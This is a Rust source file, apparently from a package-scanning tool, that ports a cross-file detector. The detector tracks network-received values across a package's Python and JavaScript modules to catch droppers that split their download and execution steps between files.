//! Cross-file received code: a port of lazaret.scanner.core's cross-file
//! follower (`_cross_file_received_issues`, `_xf_groups`, `_xf_group_issues`
//! and the `_xf_*` readers they run, section "Cross-file received code"),
//! function for function. A dropper can split the network source and the
//! code-runner across files of one package, so neither file alone trips the
//! single-file detector; the follower reads a package's files as modules
//! (what each defines, imports and exports, the environment variables it
//! sets, the events it emits and listens for), works out which names hold a
//! value received over the network, and reads each file with the received-
//! code detector (received.rs) with those names seeded.
//!
//! The patterns, name sets, limits and finding texts are the rule pack's
//! (core's own values). Offsets are code-point indices. Where the order of a
//! core dict decides what is read (the symbols kept under a limit, the
//! bodies tested for running a parameter, the first import that names a
//! seed), `OMap` keeps Python's insertion order and its overwrite-in-place.
//! A package is read with its own work budget; one that spends it, or that
//! panics, is reported as failed (the Python package then reads that package
//! with core: engine.cross_file_issues).

use crate::findings::{self, Arg, Finding, RuleText, Snippets};
use crate::json::Value;
use crate::pack::Pack;
use crate::pyre::Regex;
use crate::pystr::{self, u, Needles, PyStr};
use crate::{lexer, received, rxutil, signs};
use std::borrow::Cow;
use std::cell::RefCell;
use std::rc::Rc;
use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};

const fn c(ch: char) -> u32 {
    ch as u32
}

fn has(h: &[u32], s: &str) -> bool {
    pystr::contains(h, s)
}

fn is(h: &[u32], s: &str) -> bool {
    pystr::eq(h, s)
}

/// a + "." + b
fn dot(a: &[u32], b: &[u32]) -> PyStr {
    let mut out = Vec::with_capacity(a.len() + b.len() + 1);
    out.extend_from_slice(a);
    out.push(c('.'));
    out.extend_from_slice(b);
    out
}

fn concat(parts: &[&[u32]]) -> PyStr {
    pystr::concat(parts)
}

fn spaces(n: usize) -> impl Iterator<Item = u32> {
    std::iter::repeat(c(' ')).take(n)
}

/// s.ljust(width)
fn ljust(mut s: PyStr, width: usize) -> PyStr {
    if s.len() < width {
        s.extend(spaces(width - s.len()));
    }
    s
}

/// s.split(".")[0]
fn head(s: &[u32]) -> &[u32] {
    &s[..s.iter().position(|&x| x == c('.')).unwrap_or(s.len())]
}

fn join_rows(rows: &[&[u32]]) -> PyStr {
    pystr::join(&[c('\n')], rows)
}

// ---------------- maps in Python's dict order ----------------

/// A dict keyed by str: insertion order kept, a key set again keeps its place.
#[derive(Clone, Debug)]
struct OMap<V> {
    keys: Vec<PyStr>,
    vals: Vec<V>,
    index: HashMap<PyStr, usize>,
}

impl<V> Default for OMap<V> {
    fn default() -> Self {
        OMap { keys: Vec::new(), vals: Vec::new(), index: HashMap::new() }
    }
}

impl<V> OMap<V> {
    fn get(&self, k: &[u32]) -> Option<&V> {
        self.index.get(k).map(|&i| &self.vals[i])
    }

    fn get_mut(&mut self, k: &[u32]) -> Option<&mut V> {
        match self.index.get(k) {
            Some(&i) => Some(&mut self.vals[i]),
            None => None,
        }
    }

    fn contains(&self, k: &[u32]) -> bool {
        self.index.contains_key(k)
    }

    /// d[k] = v
    fn insert(&mut self, k: PyStr, v: V) {
        match self.index.get(&k) {
            Some(&i) => self.vals[i] = v,
            None => {
                self.index.insert(k.clone(), self.keys.len());
                self.keys.push(k);
                self.vals.push(v);
            }
        }
    }

    /// d.setdefault(k, v)
    fn setdefault(&mut self, k: PyStr, v: V) -> &mut V {
        let i = match self.index.get(&k) {
            Some(&i) => i,
            None => {
                let i = self.keys.len();
                self.index.insert(k.clone(), i);
                self.keys.push(k);
                self.vals.push(v);
                i
            }
        };
        &mut self.vals[i]
    }

    fn iter(&self) -> impl Iterator<Item = (&PyStr, &V)> {
        self.keys.iter().zip(self.vals.iter())
    }

    fn values(&self) -> &[V] {
        &self.vals
    }

    fn is_empty(&self) -> bool {
        self.keys.is_empty()
    }
}

// ---------------- what the follower reads ----------------

#[derive(Clone, Copy, PartialEq, Eq, Hash, Debug)]
pub enum Lang {
    Py,
    Js,
}

impl Lang {
    fn name(self) -> &'static str {
        match self {
            Lang::Py => "py",
            Lang::Js => "js",
        }
    }
}

/// (source, refs): does a value hold what was received, and the member
/// chains it names.
#[derive(Clone, Default, Debug)]
struct Ret {
    source: bool,
    refs: BTreeSet<PyStr>,
}

fn merge(old: &Ret, new: &Ret) -> Ret {
    Ret { source: old.source || new.source, refs: old.refs.union(&new.refs).cloned().collect() }
}

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Kind {
    Name,
    Module,
    Default,
    Star,
}

/// An import: (module key|None, imported name|None, kind, label).
#[derive(Clone, Debug)]
struct Import {
    key: Option<PyStr>,
    name: Option<PyStr>,
    kind: Kind,
    label: Option<PyStr>,
}

#[derive(Clone, Debug)]
enum Export {
    Local(PyStr),
    Ref(PyStr),
}

/// What a name resolves to: ('sym', (key, name)), ('class', (key, cls)), ('module', key).
#[derive(Clone, PartialEq, Eq, Hash, Debug)]
enum Res {
    Sym(PyStr, PyStr),
    Class(PyStr, PyStr),
    Module(PyStr),
}

/// An emitter as core keys it: what its name resolves to, an import that
/// does not resolve, or a global.
#[derive(Clone, PartialEq, Eq, Hash, Debug)]
enum Emitter {
    Res(Res),
    Import(Option<PyStr>, Option<PyStr>),
    Global(PyStr),
}

/// core._XfModule
struct Module<'t> {
    key: PyStr,
    lang: Lang,
    file: usize,
    text: &'t [u32],
    defs: OMap<Ret>,
    classes: OMap<OMap<(Ret, bool)>>,
    imports: OMap<Import>,
    exports: OMap<Export>,
    reexports: OMap<(Option<PyStr>, Option<PyStr>)>,
    stars: Vec<PyStr>,
    default: Option<PyStr>,
    default_module: Option<PyStr>,
    env: OMap<Ret>,
    bodies: OMap<(Vec<PyStr>, Vec<PyStr>)>,
    relays: OMap<(Vec<PyStr>, Vec<PyStr>)>,
}

impl<'t> Module<'t> {
    fn new(key: PyStr, lang: Lang, file: usize, text: &'t [u32]) -> Module<'t> {
        Module {
            key,
            lang,
            file,
            text,
            defs: OMap::default(),
            classes: OMap::default(),
            imports: OMap::default(),
            exports: OMap::default(),
            reexports: OMap::default(),
            stars: Vec::new(),
            default: None,
            default_module: None,
            env: OMap::default(),
            bodies: OMap::default(),
            relays: OMap::default(),
        }
    }
}

// ---------------- the pack's values ----------------

struct Lim {
    window: usize,
    max_files: usize,
    max_seeds: usize,
    rounds: usize,
    max_symbols: usize,
    max_depth: usize,
    local_depth: usize,
    object_rows: usize,
    max_runners: usize,
    max_chars: usize,
    long_row: usize,
    emit_max: usize,
}

struct Rx<'p> {
    class: &'p Regex,
    def: &'p Regex,
    assign: &'p Regex,
    ret: &'p Regex,
    from: &'p Regex,
    import: &'p Regex,
    static_: &'p Regex,
    def_end: &'p Regex,
    py_env_write: &'p Regex,
    py_dyn_import: &'p Regex,
    member_write: &'p Regex,
    params: &'p Regex,
    param_name: &'p Regex,
    arrow_one: &'p Regex,
    promise: &'p Regex,
    call_name: &'p Regex,
    js_func: &'p Regex,
    js_const: &'p Regex,
    js_fn_value: &'p Regex,
    js_class: &'p Regex,
    js_method: &'p Regex,
    js_field: &'p Regex,
    js_return: &'p Regex,
    js_local: &'p Regex,
    js_object: &'p Regex,
    js_member: &'p Regex,
    export_decl: &'p Regex,
    export_default_decl: &'p Regex,
    export_list: &'p Regex,
    export_from: &'p Regex,
    export_star: &'p Regex,
    export_default: &'p Regex,
    modexp_obj: &'p Regex,
    modexp_prop: &'p Regex,
    modexp_all: &'p Regex,
    modexp_class: &'p Regex,
    modexp_req: &'p Regex,
    modexp_fn: &'p Regex,
    define: &'p Regex,
    req_destr: &'p Regex,
    req_ns: &'p Regex,
    req_member: &'p Regex,
    imp_named: &'p Regex,
    imp_ns: &'p Regex,
    imp_default: &'p Regex,
    dyn_destr: &'p Regex,
    dyn_ns: &'p Regex,
    dirname: &'p Regex,
    js_env_write: &'p Regex,
    space: &'p Regex,
    brace: &'p Regex,
    js_line_comment: &'p Regex,
    py_quote: &'p Regex,
    py_body_single: &'p Regex,
    py_body_double: &'p Regex,
    emit: &'p Regex,
    listen: &'p Regex,
    emit_at: &'p Regex,
    listen_at: &'p Regex,
    dl_chain: &'p Regex,
    dl_str: &'p Regex,
    dl_name: &'p Regex,
    dl_source: (&'p Regex, &'p Regex),
}

/// The follower: the pack's values it reads, and the finding's options.
pub struct Xf<'p> {
    p: &'p Pack,
    rx: Rx<'p>,
    lim: Lim,
    needles: &'p Needles,
    run_needles: &'p Needles,
    not_params: &'p [PyStr],
    js_keywords: &'p [PyStr],
    object_words: &'p [PyStr],
    emit_globals: &'p [PyStr],
    dep_markers: &'p [PyStr],
    emit_needle: PyStr,
    /// (no network or run needle holds a newline, or is empty: one is in
    /// "\n".join(rows) just when it is in one of the rows)
    per_row: bool,
    /// (_XF_PY_BODY_RE is core's (?:[^\\q]|\\.)*: a string's body is read
    /// by `py_body_end`, what its match reads)
    py_body_plain: bool,
    redact: bool,
    neumaier: bool,
}

impl<'p> Xf<'p> {
    pub fn new(p: &'p Pack, redact: bool, neumaier: bool) -> Xf<'p> {
        let r = |n: &str| p.re(n);
        Xf {
            p,
            rx: Rx {
                class: r("_XF_CLASS_RE"),
                def: r("_XF_DEF_RE"),
                assign: r("_XF_ASSIGN_RE"),
                ret: r("_XF_RETURN_RE"),
                from: r("_XF_FROM_RE"),
                import: r("_XF_IMPORT_RE"),
                static_: r("_XF_STATIC_RE"),
                def_end: r("_XF_DEF_END_RE"),
                py_env_write: r("_XF_PY_ENV_WRITE_RE"),
                py_dyn_import: r("_XF_PY_DYN_IMPORT_RE"),
                member_write: r("_XF_MEMBER_WRITE_RE"),
                params: r("_XF_PARAMS_RE"),
                param_name: r("_XF_PARAM_NAME_RE"),
                arrow_one: r("_XF_ARROW_ONE_RE"),
                promise: r("_XF_PROMISE_RE"),
                call_name: r("_XF_CALL_NAME_RE"),
                js_func: r("_XF_JS_FUNC_RE"),
                js_const: r("_XF_JS_CONST_RE"),
                js_fn_value: r("_XF_JS_FN_VALUE_RE"),
                js_class: r("_XF_JS_CLASS_RE"),
                js_method: r("_XF_JS_METHOD_RE"),
                js_field: r("_XF_JS_FIELD_RE"),
                js_return: r("_XF_JS_RETURN_RE"),
                js_local: r("_XF_JS_LOCAL_RE"),
                js_object: r("_XF_JS_OBJECT_RE"),
                js_member: r("_XF_JS_MEMBER_RE"),
                export_decl: r("_XF_JS_EXPORT_DECL_RE"),
                export_default_decl: r("_XF_JS_EXPORT_DEFAULT_DECL_RE"),
                export_list: r("_XF_JS_EXPORT_LIST_RE"),
                export_from: r("_XF_JS_EXPORT_FROM_RE"),
                export_star: r("_XF_JS_EXPORT_STAR_RE"),
                export_default: r("_XF_JS_EXPORT_DEFAULT_RE"),
                modexp_obj: r("_XF_JS_MODEXP_OBJ_RE"),
                modexp_prop: r("_XF_JS_MODEXP_PROP_RE"),
                modexp_all: r("_XF_JS_MODEXP_ALL_RE"),
                modexp_class: r("_XF_JS_MODEXP_CLASS_RE"),
                modexp_req: r("_XF_JS_MODEXP_REQ_RE"),
                modexp_fn: r("_XF_JS_MODEXP_FN_RE"),
                define: r("_XF_JS_DEFINE_RE"),
                req_destr: r("_XF_JS_REQ_DESTR_RE"),
                req_ns: r("_XF_JS_REQ_NS_RE"),
                req_member: r("_XF_JS_REQ_MEMBER_RE"),
                imp_named: r("_XF_JS_IMP_NAMED_RE"),
                imp_ns: r("_XF_JS_IMP_NS_RE"),
                imp_default: r("_XF_JS_IMP_DEFAULT_RE"),
                dyn_destr: r("_XF_JS_DYN_DESTR_RE"),
                dyn_ns: r("_XF_JS_DYN_NS_RE"),
                dirname: r("_XF_JS_DIRNAME_RE"),
                js_env_write: r("_XF_JS_ENV_WRITE_RE"),
                space: r("_XF_SPACE_RE"),
                brace: r("_XF_BRACE_RE"),
                js_line_comment: r("_XF_JS_LINE_COMMENT_RE"),
                py_quote: r("_XF_PY_QUOTE_RE"),
                py_body_single: p.map_re("_XF_PY_BODY_RE", "'"),
                py_body_double: p.map_re("_XF_PY_BODY_RE", "\""),
                emit: r("_XF_EMIT_RE"),
                listen: r("_XF_LISTEN_RE"),
                emit_at: r("_XF_EMIT_AT_RE"),
                listen_at: r("_XF_LISTEN_AT_RE"),
                dl_chain: r("_DL_CHAIN_RE"),
                dl_str: r("_DL_STR_RE"),
                dl_name: r("_DL_NAME_RE"),
                dl_source: p.pair("_DL_SOURCE"),
            },
            lim: Lim {
                window: p.usize("_XF_WINDOW"),
                max_files: p.usize("_XF_MAX_FILES"),
                max_seeds: p.usize("_XF_MAX_SEEDS"),
                rounds: p.usize("_XF_ROUNDS"),
                max_symbols: p.usize("_XF_MAX_SYMBOLS"),
                max_depth: p.usize("_XF_MAX_DEPTH"),
                local_depth: p.usize("_XF_LOCAL_DEPTH"),
                object_rows: p.usize("_XF_OBJECT_ROWS"),
                max_runners: p.usize("_XF_MAX_RUNNERS"),
                max_chars: p.usize("_XF_MAX_CHARS"),
                long_row: p.usize("_DL_LONG_ROW"),
                emit_max: p.usize("_XF_EMIT_MAX"),
            },
            needles: p.needles("_DL_NEEDLES"),
            run_needles: p.needles("_DL_RUN_NEEDLES"),
            not_params: p.strs("_XF_NOT_PARAMS"),
            js_keywords: p.strs("_XF_JS_KEYWORDS"),
            object_words: p.strs("_XF_JS_OBJECT_WORDS"),
            emit_globals: p.strs("_XF_EMIT_GLOBALS"),
            dep_markers: p.strs("_XF_DEP_MARKERS"),
            emit_needle: p.text("_XF_EMIT_NEEDLE"),
            per_row: ["_DL_NEEDLES", "_DL_RUN_NEEDLES"]
                .iter()
                .all(|n| p.strs(n).iter().all(|x| !x.is_empty() && !x.contains(&c('\n')))),
            py_body_plain: ["'", "\""].iter().all(|q| {
                let rx = p.map_re("_XF_PY_BODY_RE", q);
                rx.pattern == u(&format!(r"(?:[^\\{}]|\\.)*", q)) && rx.flags & !crate::pyre::UNICODE == 0
            }),
            redact,
            neumaier,
        }
    }

    /// any(n in "\n".join(rows) for n in needles)
    fn in_rows(&self, needles: &Needles, rows: &[&[u32]]) -> bool {
        if self.per_row {
            rows.iter().any(|r| needles.any_in(r))
        } else {
            needles.any_in(&join_rows(rows))
        }
    }

    fn in_set(set: &[PyStr], s: &[u32]) -> bool {
        set.iter().any(|x| x.as_slice() == s)
    }

    // ---------------- values ----------------

    /// core._xf_has_source
    fn has_source(&self, expr: &[u32]) -> bool {
        received::dl_finditer(self.rx.dl_source, expr, 0, None).next().is_some()
    }

    /// _XF_SPACE_RE.sub("", s)
    fn nospace(&self, s: &[u32]) -> PyStr {
        self.rx.space.sub(s, &[], 0)
    }

    /// core._xf_chains
    fn chains(&self, expr: &[u32]) -> BTreeSet<PyStr> {
        self.rx.dl_chain.finditer(expr).map(|m| self.nospace(m.group0())).collect()
    }

    /// (_xf_has_source(expr), frozenset(_xf_chains(expr)))
    fn plain(&self, expr: &[u32]) -> Ret {
        Ret { source: self.has_source(expr), refs: self.chains(expr) }
    }

    /// core._xf_follow
    fn follow(&self, exprs: &[&[u32]], locals: &mut Locals) -> Ret {
        let mut source = false;
        let mut refs: BTreeSet<PyStr> = BTreeSet::new();
        for e in exprs {
            source = source || self.has_source(e);
            refs.extend(self.chains(e));
        }
        let mut frontier: HashSet<PyStr> = refs.iter().map(|r| head(r).to_vec()).collect();
        let mut seen = frontier.clone();
        for _ in 0..self.lim.local_depth {
            let mut nxt: HashSet<PyStr> = HashSet::new();
            for name in &frontier {
                if let Some(r) = locals.get(self, name) {
                    source = source || r.source;
                    for chain in &r.refs {
                        let h = head(chain);
                        if !seen.contains(h) {
                            nxt.insert(h.to_vec());
                        }
                    }
                    refs.extend(r.refs.iter().cloned());
                }
            }
            seen.extend(nxt.iter().cloned());
            frontier = nxt;
            if frontier.is_empty() {
                break;
            }
        }
        Ret { source, refs }
    }

    /// core._xf_delivers
    fn delivers(&self, body: &[&[u32]], params: &[PyStr]) -> bool {
        if !self.in_rows(self.needles, body) {
            return false;
        }
        if !body.iter().any(|row| self.needles.any_in(row) && self.has_source(row)) {
            return false;
        }
        let mut names: HashSet<PyStr> = params.iter().cloned().collect();
        for row in body {
            if has(row, "Promise") {
                for m in self.rx.promise.finditer(row) {
                    if let Some(n) = m.name("name") {
                        names.insert(n.to_vec());
                    }
                }
            }
        }
        for n in self.not_params {
            names.remove(n);
        }
        !names.is_empty()
            && body.iter().any(|row| {
                self.rx.call_name.finditer(row).any(|m| m.name("name").is_some_and(|n| names.contains(n)))
            })
    }

    /// core._xf_ret
    fn ret(&self, returns: &[&[u32]], local_rows: &[(&[u32], &[u32])], body: &[&[u32]], params: &[PyStr]) -> Ret {
        let mut locals = Locals::new(local_rows);
        let mut r = self.follow(returns, &mut locals);
        if !r.source && !body.is_empty() && self.delivers(body, params) {
            r.source = true;
        }
        r
    }

    /// core._xf_params
    fn params(&self, row: &[u32], at: usize) -> Vec<PyStr> {
        if let Some(one) = self.rx.arrow_one.match_at(row, at as isize, row.len() as isize) {
            return vec![one.name("name").unwrap_or(&[]).to_vec()];
        }
        let i = match pystr::find_char(row, c('('), at) {
            Some(i) => i,
            None => return Vec::new(),
        };
        let m = match self.rx.params.match_at(row, i as isize, row.len() as isize) {
            Some(m) => m,
            None => return Vec::new(),
        };
        let mut out = Vec::new();
        for item in pystr::split_char(m.name("params").unwrap_or(&[]), c(',')) {
            if let Some(p) = self.rx.param_name.match_(item) {
                out.push(p.name("name").unwrap_or(&[]).to_vec());
            }
        }
        out
    }

    /// core._xf_member
    fn member(module: &mut Module, cls: &[u32], name: &[u32], ret: Ret, is_static: bool) {
        let meths = module.classes.setdefault(cls.to_vec(), OMap::default());
        match meths.get_mut(name) {
            Some(slot) => slot.0 = merge(&slot.0, &ret),
            None => meths.insert(name.to_vec(), (ret, is_static)),
        }
    }

    /// core._xf_body: a body that names a code runner, else a relay
    fn body(&self, module: &mut Module, sym: PyStr, params: &[PyStr], body: &[&[u32]]) {
        if params.is_empty() || module.bodies.contains(&sym) {
            return;
        }
        if self.in_rows(self.run_needles, body) {
            module.bodies.insert(sym, (params.to_vec(), body.iter().map(|r| r.to_vec()).collect()));
        } else if !module.relays.contains(&sym) {
            module.relays.insert(sym, (params.to_vec(), body.iter().map(|r| r.to_vec()).collect()));
        }
    }

    /// core._xf_is_object
    fn is_object(module: &Module, cls: &[u32]) -> bool {
        match module.classes.get(cls) {
            Some(meths) => !meths.is_empty() && meths.values().iter().all(|(_, st)| *st),
            None => false,
        }
    }

    /// core._xf_writes
    fn writes<R: AsRef<[u32]>>(&self, module: &mut Module, masked: &[R], row_cls: &[Option<usize>], names: &[PyStr], lang: Lang) {
        enum Target {
            Member(PyStr, PyStr),
            Def(PyStr),
        }
        let mut found: Vec<(Target, &[u32])> = Vec::new();
        for (k, row) in masked.iter().enumerate() {
            let row = row.as_ref();
            if !row.contains(&c('=')) || (!row.contains(&c('.')) && !row.contains(&c('['))) || row.len() > self.lim.long_row {
                continue;
            }
            for m in self.rx.member_write.finditer(row) {
                let name = m.name("name").unwrap_or(&[]);
                let attr = m.name("attr");
                let rhs = m.name("rhs").unwrap_or(&[]);
                if is(name, "self") || is(name, "this") || is(name, "cls") {
                    match (attr, row_cls[k]) {
                        (Some(a), Some(cls)) => found.push((Target::Member(names[cls].clone(), a.to_vec()), rhs)),
                        _ => continue,
                    }
                } else if attr.is_some() && module.classes.contains(name) {
                    found.push((Target::Member(name.to_vec(), attr.unwrap_or(&[]).to_vec()), rhs));
                } else if module.defs.contains(name) {
                    found.push((Target::Def(name.to_vec()), rhs));
                }
            }
        }
        if found.is_empty() {
            return;
        }
        let mut pairs: Vec<(&[u32], &[u32])> = Vec::new();
        for row in masked {
            let row = row.as_ref();
            if !row.contains(&c('=')) || row.len() > self.lim.long_row {
                continue;
            }
            if lang == Lang::Py {
                if let Some(a) = self.rx.assign.match_(row) {
                    pairs.push((a.name("name").unwrap_or(&[]), a.name("rhs").unwrap_or(&[])));
                }
            } else {
                for m in self.rx.js_local.finditer(row) {
                    pairs.push((m.name("name").unwrap_or(&[]), m.name("rhs").unwrap_or(&[])));
                }
            }
        }
        let mut locals = Locals::new(&pairs);
        for (target, rhs) in found {
            let ret = self.follow(&[rhs], &mut locals);
            match target {
                Target::Member(cls, attr) => {
                    let st = !module.defs.contains(&cls) && Self::is_object(module, &cls);
                    Self::member(module, &cls, &attr, ret, st);
                }
                Target::Def(name) => {
                    let old = module.defs.get(&name).cloned().unwrap_or_default();
                    module.defs.insert(name, merge(&old, &ret));
                }
            }
        }
    }

    // ---------------- Python ----------------

    /// core._xf_py_mask
    fn py_mask<'a>(&self, text: &'a [u32]) -> Vec<Cow<'a, [u32]>> {
        let mut out = Vec::new();
        let mut delim: Option<u32> = None; // (the quote character of an open triple-quoted string)
        for row in pystr::split_char(text, c('\n')) {
            let n = row.len();
            if delim.is_none() && !row.iter().any(|&ch| ch == c('#') || ch == c('\'') || ch == c('"')) {
                out.push(Cow::Borrowed(row));
                continue;
            }
            let mut parts: PyStr = Vec::with_capacity(n);
            let mut i = 0usize;
            if let Some(q) = delim {
                match pystr::find(row, &[q, q, q], 0) {
                    None => {
                        out.push(Cow::Owned(vec![c(' '); n]));
                        continue;
                    }
                    Some(end) => {
                        i = end + 3;
                        parts.extend(spaces(i));
                        delim = None;
                    }
                }
            }
            while i < n {
                let m = match self.rx.py_quote.search_at(row, i as isize, n as isize) {
                    None => {
                        parts.extend_from_slice(&row[i..]);
                        break;
                    }
                    Some(m) => m,
                };
                let j = m.start();
                parts.extend_from_slice(&row[i..j]);
                let ch = row[j];
                if ch == c('#') {
                    parts.extend(spaces(n - j));
                    break;
                }
                let three = pystr::sub(row, j, j + 3);
                if three.len() == 3 && three.iter().all(|&x| x == ch) {
                    match pystr::find(row, &[ch, ch, ch], j + 3) {
                        None => {
                            parts.extend(spaces(n - j));
                            delim = Some(ch);
                            break;
                        }
                        Some(end) => {
                            parts.extend(spaces(end + 3 - j));
                            i = end + 3;
                            continue;
                        }
                    }
                }
                let k = if self.py_body_plain {
                    py_body_end(row, j + 1, ch)
                } else {
                    let body = if ch == c('\'') { self.rx.py_body_single } else { self.rx.py_body_double };
                    body.match_at(row, (j + 1) as isize, n as isize).map(|m| m.end()).unwrap_or(j + 1)
                };
                if k < n && row[k] == ch {
                    parts.push(ch);
                    parts.extend(spaces(k - j - 1));
                    parts.push(ch);
                    i = k + 1;
                } else {
                    parts.push(ch);
                    parts.extend(spaces(n - j - 1));
                    break;
                }
            }
            out.push(Cow::Owned(parts));
        }
        out
    }

    /// core._xf_py_parse
    fn py_parse(&self, module: &mut Module, pkg_parts: &[&[u32]]) {
        if module.text.len() > self.lim.max_chars {
            return;
        }
        let code = module.text;
        let masked = self.py_mask(code);
        let n = masked.len();
        let mut row_cls: Vec<Option<usize>> = vec![None; n];
        let mut cls_names: Vec<PyStr> = Vec::new();
        let mut cls: Option<PyStr> = None;
        let (mut cls_indent, mut body_indent): (isize, isize) = (-1, -1);
        let mut k = 0usize;
        while k < n {
            let row = &masked[k];
            if pystr::strip(row).is_empty() {
                k += 1;
                continue;
            }
            let indent = (row.len() - pystr::lstrip(row).len()) as isize;
            if cls.is_some() && indent <= cls_indent {
                cls = None;
            }
            if cls.is_some() && body_indent < 0 {
                body_indent = indent;
            }
            let cm = if has(row, "class") { self.rx.class.match_(row) } else { None };
            if let Some(cm) = cm {
                if indent == 0 {
                    let name = cm.name("name").unwrap_or(&[]).to_vec();
                    module.classes.setdefault(name.clone(), OMap::default());
                    cls = Some(name);
                    cls_indent = indent;
                    body_indent = -1;
                }
                k += 1;
                continue;
            }
            let d = if has(row, "def") { self.rx.def.match_(row) } else { None };
            if let Some(d) = d.filter(|_| indent == 0 || (cls.is_some() && indent > cls_indent)) {
                let mut j = k + 1;
                while j < n && j - k <= self.lim.window {
                    let r = &masked[j];
                    if !pystr::strip(r).is_empty() && (r.len() - pystr::lstrip(r).len()) as isize <= indent {
                        break;
                    }
                    j += 1;
                }
                let mut body: Vec<&[u32]> = Vec::new();
                if let Some(inline) = self.rx.def_end.search_at(row, d.end() as isize, row.len() as isize) {
                    let rest = &row[inline.end()..];
                    if !pystr::strip(rest).is_empty() {
                        body.push(rest);
                    }
                }
                body.extend(masked[k + 1..j].iter().map(|r| r.as_ref()));
                let params = self.params(row, d.end() - 1);
                let refs = &body;
                let returns: Vec<&[u32]> = refs
                    .iter()
                    .filter(|r| has(r, "return"))
                    .filter_map(|r| self.rx.ret.match_(r).map(|m| m.name("expr").unwrap_or(&[])))
                    .collect();
                let locals: Vec<(&[u32], &[u32])> = refs
                    .iter()
                    .filter(|r| r.contains(&c('=')))
                    .filter_map(|r| self.rx.assign.match_(r).map(|a| (a.name("name").unwrap_or(&[]), a.name("rhs").unwrap_or(&[]))))
                    .collect();
                let ret = self.ret(&returns, &locals, refs, &params);
                let name = d.name("name").unwrap_or(&[]).to_vec();
                match &cls {
                    None => {
                        module.defs.setdefault(name.clone(), ret);
                        self.body(module, name, &params, &body);
                    }
                    Some(cl) => {
                        let st = k > 0 && self.rx.static_.match_(&masked[k - 1]).is_some();
                        Self::member(module, cl, &name, ret, st);
                        self.body(module, dot(cl, &name), &params, &body);
                        if cls_names.last() != Some(cl) {
                            cls_names.push(cl.clone());
                        }
                        let id = cls_names.len() - 1;
                        for t in row_cls.iter_mut().take(j).skip(k) {
                            *t = Some(id);
                        }
                    }
                }
                k = j;
                continue;
            }
            let a = if row.contains(&c('=')) && (indent == 0 || (cls.is_some() && indent == body_indent)) {
                self.rx.assign.match_(row)
            } else {
                None
            };
            if let Some(a) = a {
                let rhs = a.name("rhs").unwrap_or(&[]);
                if rhs.len() <= self.lim.long_row {
                    let ret = self.plain(rhs);
                    let name = a.name("name").unwrap_or(&[]).to_vec();
                    if indent == 0 {
                        module.defs.setdefault(name, ret);
                    } else if let Some(cl) = &cls {
                        if indent == body_indent {
                            Self::member(module, cl, &name, ret, true);
                        }
                    }
                }
            }
            k += 1;
        }
        let mrefs: Vec<&[u32]> = masked.iter().map(|r| r.as_ref()).collect();
        let joined = join_rows(&mrefs);
        for m in line_matches(self.rx.from, &joined, "from") {
            let target = py_resolve(m.name("mod").unwrap_or(&[]), pkg_parts);
            let names = pystr::strip(m.name("names").unwrap_or(&[]));
            if is(names, "*") {
                let mut local = u("*");
                local.extend_from_slice(target.as_deref().unwrap_or(&[]));
                module.imports.setdefault(
                    local,
                    Import { key: target.clone(), name: Some(u("*")), kind: Kind::Star, label: target.clone() },
                );
                continue;
            }
            for item in pystr::split_char(pystr::strip_chars(names, "()"), c(',')) {
                let parts = pystr::split_ws(item);
                if parts.is_empty() {
                    continue;
                }
                let local = if parts.len() == 3 && is(parts[1], "as") { parts[2] } else { parts[0] };
                module.imports.insert(
                    local.to_vec(),
                    Import { key: target.clone(), name: Some(parts[0].to_vec()), kind: Kind::Name, label: target.clone() },
                );
            }
        }
        for m in line_matches(self.rx.import, &joined, "import") {
            for item in pystr::split_char(m.name("names").unwrap_or(&[]), c(',')) {
                let parts = pystr::split_ws(item);
                if parts.is_empty() {
                    continue;
                }
                let local = if parts.len() == 3 && is(parts[1], "as") { parts[2] } else { parts[0] };
                module.imports.insert(
                    local.to_vec(),
                    Import { key: Some(parts[0].to_vec()), name: None, kind: Kind::Module, label: Some(parts[0].to_vec()) },
                );
            }
        }
        let code_rows = pystr::split_char(code, c('\n'));
        let masked_at = |k: usize, at: usize, row: &[u32]| masked[k].get(at) == row.get(at);
        if has(code, "import_module") || has(code, "__import__") {
            for (k, row) in code_rows.iter().enumerate() {
                if !has(row, "import") || row.len() > self.lim.long_row {
                    continue;
                }
                for m in self.rx.py_dyn_import.finditer(row) {
                    if !masked_at(k, m.start(), row) {
                        continue; // in a comment or a docstring
                    }
                    let target = match py_resolve(m.name("mod").unwrap_or(&[]), pkg_parts) {
                        Some(t) => t,
                        None => continue,
                    };
                    let local = m.name("local").unwrap_or(&[]);
                    let parts = pystr::split_char(&target, c('.'));
                    let rest = m.name("rest").unwrap_or(&[]);
                    if is(m.name("fn").unwrap_or(&[]), "__import__") && !has(rest, "fromlist") && parts.len() > 1 {
                        // __import__('a.b') is the top package a; a.b is a member of it
                        module.imports.insert(
                            local.to_vec(),
                            Import { key: Some(parts[0].to_vec()), name: None, kind: Kind::Module, label: Some(parts[0].to_vec()) },
                        );
                        for i in 2..=parts.len() {
                            let sub = pystr::join(&[c('.')], &parts[..i]);
                            let name = concat(&[local, &sub[parts[0].len()..]]);
                            module.imports.insert(
                                name,
                                Import { key: Some(sub.clone()), name: None, kind: Kind::Module, label: Some(sub) },
                            );
                        }
                    } else {
                        module.imports.insert(
                            local.to_vec(),
                            Import { key: Some(target.clone()), name: None, kind: Kind::Module, label: Some(target) },
                        );
                    }
                }
            }
        }
        for (k, row) in code_rows.iter().enumerate() {
            if !has(row, "environ") || row.len() > self.lim.long_row {
                continue;
            }
            for m in self.rx.py_env_write.finditer(row) {
                if !masked_at(k, m.start(), row) {
                    continue; // in a comment or a docstring
                }
                let (a, b) = m.name_span("rhs").unwrap_or((0, 0));
                let rhs = pystr::sub(&masked[k], a, b);
                let var = m.name("var").unwrap_or(&[]).to_vec();
                let old = module.env.get(&var).cloned().unwrap_or_default();
                let mut new = Ret { source: old.source || self.has_source(rhs), refs: old.refs };
                new.refs.extend(self.chains(rhs));
                module.env.insert(var, new);
            }
        }
        self.writes(module, &masked, &row_cls, &cls_names, Lang::Py);
    }

    // ---------------- JavaScript ----------------

    /// core._xf_js_mask_line
    fn js_mask_line(&self, row: &[u32]) -> PyStr {
        self.rx.dl_str.sub_fn(row, 0, |m| {
            let s = m.group0();
            if s.len() >= 2 {
                let mut v = vec![s[0]];
                v.extend(spaces(s.len() - 2));
                v.push(s[s.len() - 1]);
                v
            } else {
                s.to_vec()
            }
        })
    }

    /// core._xf_js_body: the rows of the brace body that starts at the first
    /// '{' at or after column `at` of row k.
